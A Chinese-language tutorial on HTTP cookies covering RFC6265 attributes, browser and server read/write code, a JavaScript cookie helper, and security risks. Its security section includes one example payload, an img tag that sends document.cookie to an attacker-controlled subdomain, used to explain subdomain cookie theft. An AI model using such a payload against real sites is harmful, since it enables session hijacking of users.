cookie
=======

> RFC6265：[HTTP State Management Mechanism](https://tools.ietf.org/html/rfc6265)

> Wiki: [HTTP_cookie](https://en.wikipedia.org/wiki/HTTP_cookie)

cookie是一段可以由网站服务端发送，并在浏览器本地存储的，
用于记录用户行为状态（如购物车，浏览记录）或用户身份（是否登录）等信息的数据。

当服务器向客户端做出响应时，通过添加response header中的 `set-cookie` 字段，
将cookie信息携带给客户端，这个过程是需要手动添加实现的。

`set-cookie`字段可以在任何一个response中被设置，
客户端可以在response的状态码等于1XX的时候忽略这个字段，
但等于其他状态码（包括4XX，5XX）的时候则不能忽略。

当客户端发http请求到服务端时，浏览器会检查是否有已存储的cookie，
有则自动添加在request header中的 `cookie` 字段中，发送到服务端，
这个过程是自动实现的，而且是每次请求均会如此执行。

因此，根据浏览器自动携带cookie这一个特性，
可以发现并不是所有的数据都适合长久的存放于cookie中，
只有那些“每次请求都需要与服务器沟通的信息”才需要长久的保存在cookie中，
否则就会造成网络带宽的浪费。

在规范中cookie的存储是有限制的，但各个浏览器厂商实现也略存在差异，
具体情况需要实际测试。规范中的限制包括：

+ 每条cookie至少可以存储4096字节(byte)，包括cookie的name, value, attribute数据长度的总和，
  【虽然规范指定**至少**，但浏览器厂商实现各异，保险起见，在使用时最好小于4095字节】

+ 每个域下至少存储50条cookie

+ 浏览器一共至少可以3000条cookie

规范中还指出服务端应尽量减小cookie的大小，以压缩带宽，
并保证每次请求都能携带上cookie的信息，因此，虽然规范使用的是 **至少**来限定，
但在实际的开发中，应当按**至多**来使用，除非已经在特定的浏览器中实际测试成功。

一条cookie是包含一个{key:value}键值对和多个attribute(键值对或键)的字符串。
其中attribute包括：`exoires`, `max-age`, `domain`, `path`, `secure`, `httponly`

cookie字符串有以下特性：

+ `键值对`或`键`之间使用`;`(分号)做分隔符
+ `键名` 大小写不敏感。
+ `key`与`value`之间使用`=`(等号)做分割符，以第一个出现的为准，
  后续出现的`=`视为`value`的值部分，如果整条cookie中未出现`=`，
  则认为此条cookie不合法，会被忽略
+ `键名`与`值` 首尾的空格均会被自动trim，中间出现的空格会全部保留
+ `value`(非attribute的value)可以是任意字符，
  包括attribute的名字，等号等保留关键字，甚至空字符串也是可以的。
  但分号不可以，因为分号被认为是`键值对`或`键`的结束。

> 部分文档中有使用空格和分号做分隔符的说法，实际上空格并不是必须的，
> 因为key与value首尾的空格均会被过滤掉，
> 因此不使用空格或使用多个空格效果是一样的。

+ ${key}=${value}【必填】：

  `key`: cookie的名字，不能是空字符串

  `=`: 分割符

  `value`: cookie的值，可以是任意字符

  注意：

  + `key` 为空或是一串空格（首尾空格会trim掉等于空），此条cookie会被忽略
  + `value`可以是任意字符，包括保留关键字、等号、空字符，
    但这些均是不推荐使用的。

  实际开发中要避免使用cookie的保留字段作为value，以免造成混乱，
  当cookie的`value`中出现保留字段，可用来判定可能是存储时丢失分隔符造成的。

  对于一定要使用空格、等号等特殊字符的场景，要对`key`和`value`的值进行escape。
  （例如：存储时使用`encodeURIComponent`进行编码，
  读取时再使用`decodeURIComponent`进行解码）


+ expires【选填】：过期时间

  注意:

  + 必须是UTC时间格式，可使用`date.toUTCString()`或`date.toGMTString()`方法来获得,
    如果使用了非UTC格式的值，则认为此条cookie非法，会被忽略。
  + 如果设置时间早于或刚好等于当前时间，则认为立即过期，此cookie会被删除
  + 如果未设置此字段，则过期时间为session结束的时间，即关闭浏览器的时间

  tips:

  关闭正在访问网页并不代表session结束，因为现代浏览器大多提供标签(tab card)功能，
  关闭网页只是关闭一个标签，但session信息会在所有标签中共享，
  所以只有关闭了浏览器，session信息才会清除。

  例如：

  `expires=Sun, 07 Jan 2018 08:21:24 GMT` ，
  则过期时间是UTC时刻2018年1月7日08:21:24，超过这个时刻此条cookie会失效，
  注意：UTC时刻指的是0时区的UTC时间，也就是GMT时间
  ([UTC与GMT区别](https://www.zhihu.com/question/27052407))

+ max-age【选填】: 过期时间(秒)，与`expires`具有相同作用

  注意：

  + `max-age` 优先级大于`expires`，即同时设置了 `expires`和`max-age`以max-age为准
  + 部分浏览器不支持此属性，如ie6, ie7, ie8
  + `max-age`设置 `负数` 或 `0` 时，代表立即失效，则删除此cookie
  + `max-age`设置`正数`时，代表在 多少秒后 过期，即过期时间=创建时刻 + max-age
  + `max-age`使用数字外的字符(除首字符是负号外)均属于非法值，此条cookie会被忽略

  > 部分文档中指出 `max-age`的默认值是`-1`，过期时间同session，
  > 其实`max-age`并没有默认值，只是未设置`max-age`和未设置`expires`的行为一致，
  > 过期时间是seesion结束的时间。

+ domain【选填】：客户端访问哪些域名时会携带上此条cookie

  注意：

  + 如果未设置，规范中并未定义默认行为，只是建议忽略此条cookie。
    因此各个浏览器实现上存在差异，
    比较流行的做法是只会发给当前域的请求，但不会发给子域

  + 如果设置，则会发给设置的域及其子域
  + 域名的分割符使用 `.`，如果`value`以`.`开头，则开头的`.`会被忽略
  + `domain` 不能设置非法的域，当设置非法的域时，此条cookie会被忽略

  例如：

  在域`foo.example.com`中可以设置 `foo.example.com` 或 `example.com`,
  但设置`bar.example.com` 或`baz.foo.example.com`均会失败。此外，
  设置公共域前缀（如`com`，`co.uk`）也会失败

+ path【选填】：客户端访问哪些路径时会携带上此条cookie

  + 如果未设置，则默认使用根路径 `/` , 即所以请求都会带上此cookie
  + 如果设置，则匹配此路径及其子路径，如设置 `/foo` , 则 `/foo` `/foo/bar` 均会携带此cookie
  + 路径分隔符使用 `/`

+ secure【选填】：只能通过可靠协议传输（using SSL and the HTTPS protocol）

  注意：

  + 在使用http协议时不要设置此字段，否则cookie会设置失败
  + 默认此字段不设置，`secure`不使用键值对方式表达，因此不设置是指不写此key。
    `secure=;`，`secure=null;`，`secure=undefined;`等均等效于`secure;`，即设置secure。

+ httponly 【选填】: 控制cookie是否只能服务端读写

  使用此字段一般用于避免XSS攻击，
  由于XSS攻击多数通过盗取用户cookie中的身份信息后发起攻击，
  因此对cookie中的身份信息使用`httponly`，客户端就无法获取，
  从而降低XSS攻击的可能，但这并不是避免XSS攻击最有效的手段。

  注意：

  + 此字段只能在服务端设置，客户端无法设置此字段
  + 默认此字段不设置，即客户端可访问
  + 当设置此字段后，客户端不能访问实际js无法访问，但可以通过其他途径看到，
    如使用开发者工具(chrome-> F12 -> Application -> cookies)
  + 此字段不使用键值对方式表达，设置方式同`secure`


cookie在浏览器端与在服务端的读写略有差异，服务端能控制的功能大于客户端。
由于cookie的读写与语言相关，浏览器端只使用js语言，直接介绍js方法即可，
服务端语言比较多，实现方法各异，但均是通过添加 response header 的`set-cookie`字段完成

# 客户端(浏览器)中使用cookie

## 读取cookie

  可直接调用 `document.cookie` 取值。例如：

  在github网站的console中运行以下代码，会打印出客户端可访问的所有的cookie键值对。
  （当设置`httponly`客户端是无法访问的）

  ```javascript
    console.log(document.cookie)
    // output: "_octo=GH1.1.641397018.1515304792; _ga=GA1.2.1568990340.1515304792; tz=Asia%2FShanghai; _gat=1"
  ```

## 设置cookie

  可直接调用 `document.cookie = 'cookie_value'` 完成cookie的写入

  JS表达式：

  ```javascript
    document.cookie = `${key}=${value};max-age=${max-age-in-seconds};expires=${date-in-GMTString-format};domain=${domain};path=${path};secure;`
  ```
  注意：

  + 这个方法一次只能对一个cookie的键进行设置或更新，操作多个cookie调用多次即可
  + 当cookie中无此key时，则写入一个新的此key的cookie
  + 当cookie中已经包含此key，则执行更新操作，即覆盖原有的值，
  + 删除cookie通过设置`max-age`或`expires`使其立即过期即可。
  + 使用形如`foo=;`的方式并不是删除cookie，而是修改名是foo的cookie值等于空字符串

  由于使用原生的js操作cookie是比较麻烦的事情，
  尤其是读取，所有的cookie会以一个字符串的方式返回，
  里面涵盖了所有可使用的cookie，控制起来比较繁琐。

  下面提供一个简单的cookie tool 示例

  ```javascript
  /*\
  |*|
  |*|  :: cookies.js ::
  |*|
  |*|  Syntaxes:
  |*|
  |*|  * docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])
  |*|  * docCookies.getItem(name)
  |*|  * docCookies.removeItem(name[, path], domain)
  |*|  * docCookies.hasItem(name)
  |*|  * docCookies.keys()
  |*|
  \*/

  var docCookies = {
    getItem: function (sKey) {
      return decodeURIComponent(document.cookie.replace(new RegExp("(?:(?:^|.*;)\\s*" + encodeURIComponent(sKey).replace(/[\-\.\+\*]/g, "\\$&") + "\\s*\\=\\s*([^;]*).*$)|^.*$"), "$1")) || null;
    },
    setItem: function (sKey, sValue, vEnd, sPath, sDomain, bSecure) {
      if (!sKey || /^(?:expires|max\-age|path|domain|secure)$/i.test(sKey)) { return false; }
      var sExpires = "";
      if (vEnd) {
        switch (vEnd.constructor) {
          case Number:
            sExpires = vEnd === Infinity ? "; expires=Fri, 31 Dec 9999 23:59:59 GMT" : "; max-age=" + vEnd;
            break;
          case String:
            sExpires = "; expires=" + vEnd;
            break;
          case Date:
            sExpires = "; expires=" + vEnd.toUTCString();
            break;
        }
      }
      document.cookie = encodeURIComponent(sKey) + "=" + encodeURIComponent(sValue) + sExpires + (sDomain ? "; domain=" + sDomain : "") + (sPath ? "; path=" + sPath : "") + (bSecure ? "; secure" : "");
      return true;
    },
    removeItem: function (sKey, sPath, sDomain) {
      if (!sKey || !this.hasItem(sKey)) { return false; }
      document.cookie = encodeURIComponent(sKey) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT" + ( sDomain ? "; domain=" + sDomain : "") + ( sPath ? "; path=" + sPath : "");
      return true;
    },
    hasItem: function (sKey) {
      return (new RegExp("(?:^|;\\s*)" + encodeURIComponent(sKey).replace(/[\-\.\+\*]/g, "\\$&") + "\\s*\\=")).test(document.cookie);
    },
    keys: /* optional method: you can safely remove it! */ function () {
      var aKeys = document.cookie.replace(/((?:^|\s*;)[^\=]+)(?=;|$)|^\s*|\s*(?:\=[^;]*)?(?:\1|$)/g, "").split(/\s*(?:\=[^;]*)?;\s*/);
      for (var nIdx = 0; nIdx < aKeys.length; nIdx++) { aKeys[nIdx] = decodeURIComponent(aKeys[nIdx]); }
      return aKeys;
    }
  };

  // 对于永久cookie我们用了Fri, 31 Dec 9999 23:59:59 GMT作为过期日。
  // 如果你不想使用这个日期，可使用世界末日Tue, 19 Jan 2038 03:14:07 GMT，
  // 它是32位带符号整数能表示从1 January 1970 00:00:00 UTC开始的最大秒长
  // (即01111111111111111111111111111111, 是 new Date(0x7fffffff * 1e3))

  ```

# 在服务端使用cookie

## 设置cookie

  将cookie字符串写入response header 的 `set-cookie`字段即可

  注意：

  + 每一个`set-cookie`字段只能一个cookie，写入多个可能因无法识别导致全部失败
  + 设置多个cookie，需要添加同样多的set-Cookie字段

  nodejs中写入cookie（并不是唯一的方法）

  ```javascript
  response.setHeader('Set-Cookie', ['type=ninja', 'language=javascript']);
  ```

  php中写入cookie（并不是唯一的方法）

  ```php
  bool setcookie ( string $name [, string $value = "" [, int $expire = 0 [, string $path = "" [, string $domain = "" [, bool $secure = false [, bool $httponly = false ]]]]]] )
  ```
## 读取cookie

  通过读取 request header 的`cookie` 字段即可，
  与 `document.cookie` 的读取结果一样，会一次拿到所有的cookie值，
  因此原生的方式略显笨重，好在各个服务端框架均会提供读取的方法或插件。

# cookie与安全

+ 弱的同源策略

  + domain

  当cookie设置domain的值，则意味着被设置的域及其子域都可以访问此cookie，
  那么攻击者可通过伪造子域的方式盗取cookie。

  例如：

  设置`token_a=xxx;domain=foo.com;`，那么域名是
  `foo.com`, `bar.foo.com`的请求都可以获取`token_a`，
  如果攻击者发布了一个域名是`attack.foo.com`的钓鱼网站，站内有以下脚本
  `<img src='http://attack.foo.com?cookie=${document.cookie}'></img>`,
  恰好用户正在浏览`foo.com`，并从某个途径(邮件，qq等)打开了`attack.foo.com`,
  此时钓鱼可成功盗取在`foo.com`的cookie。

  + port

  cookie对端口是无感知的，在`80`写入的cookie，在`443`端口也可以读取和改写，
  因此攻击者同样可以伪造一个同域名但不同端口的钓鱼网站来盗取用户的cookie。

+ secure

由于http协议的不安全性，使用`secure`字段可限制cookie只在加密协议下传输，
从而降低降低攻击者在网络传输中截获cookie的可能性。

+ xss攻击与httponly

xss攻击通过向网站注入可执行的脚本盗取cookie，
因此可通过设置httponly避免cookie被js获取，从而降低xss的攻击的可能性，
但低于xss攻击首先应该是避免网站被注入可执行的脚本，对用户提交的表单使用escape。

+ csrf攻击

避免cookie被盗取多是抵御csrf攻击，由于csrf_token有时会使用cookie存储，
如果cookie被盗取，那么就有可能形成csrf攻击。

抵御cookie被盗取后的csrf，可使用一下几种方式

  + 动态csrf_token：利用scrf_token短效性，即使获取cookie也会在短期内过期失效
  + 部分Identifiers：cookie中只是部分token内容，即使获取cookie也无法完成完整的校验
  + Origin，Referer 请求头校验，即使获取到cookie由于同源策略拒绝可接受域的请求
